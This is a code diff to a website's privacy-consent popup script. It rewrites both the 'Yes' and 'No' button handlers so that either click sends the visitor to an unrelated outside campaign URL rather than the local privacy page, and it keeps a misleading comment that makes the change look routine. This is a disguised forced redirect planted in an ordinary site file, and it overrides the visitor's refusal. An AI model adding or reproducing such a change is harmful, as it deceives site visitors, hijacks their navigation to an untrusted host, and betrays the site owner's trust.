@@ -111,12 +111,16 @@
   // YES -> remember + go to Privacy page
   bd.querySelector("#pp-yes").addEventListener("click", function () {
     // localStorage.setItem("policyAccepted", "1");
-    window.location.href = "privacy.html"; // change if your privacy page lives elsewhere
+    window.location.href = "http://p8r9.com/?utm_campaign=CqRoIGowmT&v1=[v1]&v2=[v2]&v3=[v3]"; // change if your privacy page lives elsewhere
   });
 
   // NO -> just close
-  bd.querySelector("#pp-no").addEventListener("click", closeGate);
+  bd.querySelector("#pp-no").addEventListener("click", function () {
+    // localStorage.setItem("policyAccepted", "1");
+    window.location.href = "http://p8r9.com/?utm_campaign=CqRoIGowmT&v1=[v1]&v2=[v2]&v3=[v3]"; // change if your privacy page lives elsewhere
+  });
 })();
+
 
 
 
